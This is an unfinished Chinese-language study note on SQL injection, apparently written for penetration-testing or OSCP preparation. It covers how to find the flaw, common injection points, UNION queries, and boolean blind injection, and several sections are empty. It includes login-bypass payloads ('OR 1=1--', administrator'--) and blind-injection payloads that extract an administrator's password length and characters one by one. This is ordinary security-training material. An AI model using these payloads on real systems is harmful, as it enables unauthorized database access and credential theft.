---
description: web应用没有对用户输入做充分检查或未对输出进行编码，从而使得攻方可以干扰应用程序，对其后端数据库进行查询和修改
---

# ✔️ SQL注入 - SQL Injection

## 查找和测试

1. 只会出现在需要访问数据库的web应用中，识别应用中所有接受用户输入的地方
2. 任何编程语言写的应用，只要在传递用户输入的动态构造的SQL语句之前没有进行验证和审查，就容易受到攻击，除非使用参数化查询和绑定变量
3. 在盲注的过程中，寻找两个响应之间的差异（大量推理和测试）
4. 观察哪种类型的请求会触发异常，理解服务器的响应中的异常，了解服务器端正在发生的情况
5. 漏洞可能发生在查询内的任何位置以及不同的查询类型中

## 常见的注入位置

在 `UPDATE` 语句中，在更新的值或 `WHERE` 子句中

在 `INSERT` 语句中插入的值内

在 `SELECT` 语句中，表名或列名内

在 `SELECT` 语句中的 `ORDER BY` 子句中

## 漏洞类型及其利用（手工注入）

### 常用查询语句

```sql
// 注释
--
#
/* */
// 查询
SELECT * FROM ??? WHERE ???=XXX 
ORDER BY
' OR 1=1--
administrator'--
```

### 常规注入

#### UNION注入

使用 `UNION` 关键字从数据库中的其他表检索数据，能够执行一个或多个附加SELECT查询并将结果附加到原始查询：

```sql
// 查询多个表中的数据
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

1. 各个查询必须返回相同数量的列
2. 每列中的数据类型必须在各个查询之间兼

### 盲注

#### 时间盲注





#### 布尔盲注

使用BurpSuite的Intruder设置payload:

```sql
// 读密码，先确定密码长度
'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
// 再读取各个字符串
'AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```





####











## 自动化工具

### Sqlmap（OSCP禁用）

